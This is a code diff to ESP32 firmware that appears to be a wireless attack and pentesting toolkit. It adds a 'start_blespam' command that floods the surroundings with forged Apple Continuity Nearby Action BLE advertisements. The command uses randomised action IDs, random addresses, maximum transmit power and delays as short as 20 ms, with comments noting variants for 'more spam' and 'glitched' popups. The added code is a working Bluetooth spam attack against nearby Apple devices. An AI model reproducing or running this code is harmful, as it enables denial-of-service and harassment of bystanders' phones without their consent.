@@ -134,11 +134,12 @@
 #include "wifi_channel_policy.h"
 #include <math.h>
 
-// NimBLE includes for BLE scanning
+// NimBLE includes for BLE scanning and non-connectable advertising
 #include "nimble/nimble_port.h"
 #include "nimble/nimble_port_freertos.h"
 #include "host/ble_hs.h"
 #include "host/util/util.h"
+#include "esp_bt.h"
 
 #include "esp_rom_sys.h"
 #include "soc/soc.h"
@@ -1084,10 +1085,13 @@ static void log_memory_info(const char *context)
 // Apple Find My Network device type (AirTag, AirPods, etc.)
 #define APPLE_FIND_MY_TYPE      0x12
 
-// BLE scan state
+// BLE scan / spam state
 static volatile bool bt_scan_active = false;
 static volatile bool bt_airtag_scan_active = false;
 static TaskHandle_t bt_scan_task_handle = NULL;
+static volatile bool bt_blespam_active = false;
+static TaskHandle_t bt_blespam_task_handle = NULL;
+static uint16_t bt_blespam_delay_ms = 20;
 static volatile bool nimble_initialized = false;
 
 // BLE device tracking for deduplication
@@ -2577,9 +2581,12 @@ static void deauth_detector_channel_hop(void);
 // BLE scanner functions (NimBLE)
 static int cmd_scan_bt(int argc, char **argv);
 static int cmd_scan_airtag(int argc, char **argv);
+static int cmd_start_blespam(int argc, char **argv);
 static void bt_scan_stop(void);
+static void bt_blespam_stop(void);
 static void bt_scan_task(void *pvParameters);
 static void bt_airtag_scan_task(void *pvParameters);
+static void bt_blespam_task(void *pvParameters);
 static bool is_broadcast_bssid(const uint8_t *bssid);
 static bool is_own_device_mac(const uint8_t *mac);
 static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi);
@@ -7824,6 +7831,10 @@ static int cmd_start_wardrive_promisc_impl(int argc, char **argv, bool trace_ena
         MY_LOG_INFO(TAG, "Cannot start wardrive promisc while BT scan is running. Use 'stop' first.");
         return 1;
     }
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start wardrive promisc while BLE spam is running. Use 'stop' first.");
+        return 1;
+    }
 
     operation_stop_requested = false;
 
@@ -8036,6 +8047,10 @@ static int cmd_start_antisurveillance(int argc, char **argv) {
     }
     if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
         MY_LOG_INFO(TAG, "Cannot start anti-surveillance while a BT scan is running. Use 'stop' first.");
+        return 1;
+    }
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start anti-surveillance while BLE spam is running. Use 'stop' first.");
         return 1;
     }
 
@@ -15014,8 +15029,9 @@ static int cmd_stop(int argc, char **argv) {
         }
     }
     
-    // Stop BLE scanner if running
+    // Stop BLE scanner / spam if running
     bt_scan_stop();
+    bt_blespam_stop();
     
     // Disconnect from AP if connected via wifi_connect and reset WiFi
     if (current_radio_mode == RADIO_MODE_WIFI && wifi_initialized) {
@@ -15084,6 +15100,7 @@ static bool zig_recon_radio_busy(char *reason, size_t reason_len)
     else if (wardrive_active || wardrive_task_handle != NULL) why = "wardrive";
     else if (wardrive_promisc_active || wardrive_promisc_task_handle != NULL) why = "wardrive_promisc";
     else if (antisurv_active || antisurv_task_handle != NULL) why = "antisurveillance";
+    else if (bt_blespam_active || bt_blespam_task_handle != NULL) why = "blespam";
     else if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) why = "ble_scan";
     else if (nrf24_jammer_is_running()) why = "nrf24";
 
@@ -22633,6 +22650,10 @@ static int cmd_start_wardrive(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Cannot start wardrive while GPS raw reader is running. Use 'stop' to stop it first.");
         return 1;
     }
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start wardrive while BLE spam is running. Use 'stop' first.");
+        return 1;
+    }
     
     // Reset stop flag at the beginning of operation
     operation_stop_requested = false;
@@ -25870,14 +25891,23 @@ static void bt_nimble_deinit(void)
         return;
     }
     
-    // Stop any active scanning
+    // Stop any active scanning / advertising
     bt_scan_active = false;
     bt_airtag_scan_active = false;
+    bt_blespam_active = false;
     bt_stop_scan();
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
     
-    // Wait for scan task to finish
+    // Wait for scan / spam tasks to finish
     if (bt_scan_task_handle != NULL) {
         for (int i = 0; i < 20 && bt_scan_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+    }
+    if (bt_blespam_task_handle != NULL) {
+        for (int i = 0; i < 20 && bt_blespam_task_handle != NULL; i++) {
             vTaskDelay(pdMS_TO_TICKS(100));
         }
     }
@@ -26166,6 +26196,10 @@ static int cmd_scan_bt(int argc, char **argv)
         return 1;
     }
     
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "BLE spam running. Use 'stop' first.");
+        return 1;
+    }
     if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
         MY_LOG_INFO(TAG, "BLE scan already running. Use 'stop' to stop it first.");
         return 1;
@@ -26240,6 +26274,10 @@ static int cmd_scan_airtag(int argc, char **argv)
         return 1;
     }
     
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "BLE spam running. Use 'stop' first.");
+        return 1;
+    }
     if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
         MY_LOG_INFO(TAG, "BLE scan already running. Use 'stop' to stop it first.");
         return 1;
@@ -26263,6 +26301,235 @@ static int cmd_scan_airtag(int argc, char **argv)
         return 1;
     }
     
+    return 0;
+}
+
+/* Apple Continuity Nearby Action IDs used by Momentum BLE Spam "Apple Action Modal".
+ * https://github.com/furiousMAC/continuity/ */
+static const uint8_t blespam_na_actions[] = {
+    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09,
+    0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B
+};
+
+static uint16_t blespam_ms_to_itvl(uint16_t ms)
+{
+    uint32_t itvl = ((uint32_t)ms * 8u) / 5u; /* 0.625 ms units */
+    if (itvl < 0x20) {
+        itvl = 0x20;
+    }
+    if (itvl > 0x4000) {
+        itvl = 0x4000;
+    }
+    return (uint16_t)itvl;
+}
+
+static void blespam_make_nearby_action(uint8_t packet[11])
+{
+    uint8_t action = blespam_na_actions[esp_random() % sizeof(blespam_na_actions)];
+    uint8_t flags = 0xC0;
+    if (action == 0x20 && (esp_random() % 2u) != 0) {
+        flags--; /* more spam for "Join This AppleTV?" */
+    }
+    if (action == 0x09 && (esp_random() % 2u) != 0) {
+        flags = 0x40; /* glitched "Setup New Device" */
+    }
+
+    uint32_t auth = esp_random();
+    packet[0] = 0x0A; /* AD length */
+    packet[1] = 0xFF; /* Manufacturer Specific */
+    packet[2] = 0x4C; /* Apple company ID */
+    packet[3] = 0x00;
+    packet[4] = 0x0F; /* Continuity Nearby Action */
+    packet[5] = 0x05; /* Continuity payload length */
+    packet[6] = flags;
+    packet[7] = action;
+    packet[8] = (uint8_t)auth;
+    packet[9] = (uint8_t)(auth >> 8);
+    packet[10] = (uint8_t)(auth >> 16);
+}
+
+static int blespam_start_adv(const uint8_t *packet, uint8_t packet_len, uint16_t delay_ms)
+{
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+        vTaskDelay(1);
+    }
+
+    int rc = ble_gap_adv_set_data(packet, packet_len);
+    if (rc != 0) {
+        return rc;
+    }
+
+    struct ble_gap_adv_params params = {0};
+    params.conn_mode = BLE_GAP_CONN_MODE_NON;
+    params.disc_mode = BLE_GAP_DISC_MODE_NON;
+    params.itvl_min = blespam_ms_to_itvl(delay_ms);
+    params.itvl_max = blespam_ms_to_itvl((uint16_t)(delay_ms + delay_ms / 2));
+    params.channel_map = 0x07; /* 37 | 38 | 39 */
+
+    return ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER,
+                             &params, NULL, NULL);
+}
+
+static void bt_blespam_task(void *pvParameters)
+{
+    (void)pvParameters;
+    uint16_t delay_ms = bt_blespam_delay_ms;
+    uint32_t packets = 0;
+    int64_t last_status_us = esp_timer_get_time();
+    int64_t last_fail_us = 0;
+
+    ble_addr_t rnd;
+    int rc = ble_hs_id_gen_rnd(0, &rnd);
+    if (rc == 0) {
+        rc = ble_hs_id_set_rnd(rnd.val);
+    }
+    if (rc != 0) {
+        MY_LOG_INFO(TAG, "BLE spam: failed to set random address (%d)", rc);
+        bt_blespam_active = false;
+        bt_blespam_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P20);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P20);
+
+    while (bt_blespam_active && !operation_stop_requested) {
+        uint8_t packet[11];
+        blespam_make_nearby_action(packet);
+
+        rc = blespam_start_adv(packet, sizeof(packet), delay_ms);
+        if (rc == 0) {
+            packets++;
+        } else {
+            int64_t fail_now = esp_timer_get_time();
+            if (last_fail_us == 0 || fail_now - last_fail_us >= 1000000) {
+                MY_LOG_INFO(TAG, "BLE spam: adv start failed (%d)", rc);
+                last_fail_us = fail_now;
+            }
+        }
+
+        int64_t now = esp_timer_get_time();
+        if (now - last_status_us >= 1000000) {
+            MY_LOG_INFO(TAG, "[BLESPAM] packets=%u delay=%u",
+                        (unsigned)packets, (unsigned)delay_ms);
+            last_status_us = now;
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(delay_ms));
+        if (ble_gap_adv_active()) {
+            ble_gap_adv_stop();
+        }
+    }
+
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    bt_blespam_active = false;
+    bt_blespam_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void bt_blespam_stop(void)
+{
+    if (!bt_blespam_active && bt_blespam_task_handle == NULL) {
+        return;
+    }
+
+    bt_blespam_active = false;
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+
+    for (int i = 0; i < 40 && bt_blespam_task_handle != NULL; i++) {
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    if (bt_blespam_task_handle != NULL) {
+        vTaskDelete(bt_blespam_task_handle);
+        bt_blespam_task_handle = NULL;
+    }
+
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    MY_LOG_INFO(TAG, "BLE spam stopped.");
+}
+
+/**
+ * Command: start_blespam - Apple Continuity Nearby Action (Momentum Action Modal)
+ *   start_blespam
+ *   start_blespam [20|50|100|200|500]
+ */
+static int cmd_start_blespam(int argc, char **argv)
+{
+    uint16_t delay_ms = 20;
+    if (argc > 2) {
+        MY_LOG_INFO(TAG, "Usage: start_blespam [20|50|100|200|500]");
+        return 1;
+    }
+    if (argc == 2) {
+        char *end = NULL;
+        unsigned long value = strtoul(argv[1], &end, 10);
+        if (end == argv[1] || *end != '\0' ||
+            !(value == 20 || value == 50 || value == 100 || value == 200 || value == 500)) {
+            MY_LOG_INFO(TAG, "Usage: start_blespam [20|50|100|200|500]");
+            return 1;
+        }
+        delay_ms = (uint16_t)value;
+    }
+
+    {
+        char oled_l3[24];
+        snprintf(oled_l3, sizeof(oled_l3), "  delay %ums", delay_ms);
+        oled_display_update_full("> BLE Spam", "  Action Modal", oled_l3, "  Advertising...");
+    }
+    log_memory_info("start_blespam");
+
+    if (bt_blespam_active || bt_blespam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "BLE spam already running. Use 'stop' first.");
+        return 1;
+    }
+    if (bt_scan_active || bt_airtag_scan_active || bt_scan_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start BLE spam while BT scan is running. Use 'stop' first.");
+        return 1;
+    }
+    if (wardrive_promisc_active || wardrive_promisc_task_handle != NULL ||
+        wardrive_active || wardrive_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start BLE spam while wardrive is running. Use 'stop' first.");
+        return 1;
+    }
+    if (antisurv_active || antisurv_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Cannot start BLE spam while anti-surveillance is running. Use 'stop' first.");
+        return 1;
+    }
+
+    if (!ensure_ble_mode()) {
+        MY_LOG_INFO(TAG, "BLE initialization failed");
+        return 1;
+    }
+
+    bt_blespam_delay_ms = delay_ms;
+    operation_stop_requested = false;
+    bt_blespam_active = true;
+
+    BaseType_t task_ret = xTaskCreate(
+        bt_blespam_task,
+        "bt_blespam_task",
+        4096,
+        NULL,
+        5,
+        &bt_blespam_task_handle
+    );
+    if (task_ret != pdPASS) {
+        bt_blespam_active = false;
+        bt_blespam_task_handle = NULL;
+        MY_LOG_INFO(TAG, "Failed to create BLE spam task");
+        return 1;
+    }
+
+    MY_LOG_INFO(TAG, "BLE spam started (Apple Action Modal). Use 'stop' to end.");
     return 0;
 }
 
@@ -27827,6 +28094,15 @@ static void register_commands(void)
         .argtable = NULL
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&scan_airtag_cmd));
+
+    const esp_console_cmd_t start_blespam_cmd = {
+        .command = "start_blespam",
+        .help = "Apple Action Modal BLE spam: start_blespam [20|50|100|200|500]",
+        .hint = "[20|50|100|200|500]",
+        .func = &cmd_start_blespam,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&start_blespam_cmd));
 
     const esp_console_cmd_t version_cmd = {
         .command = "version",
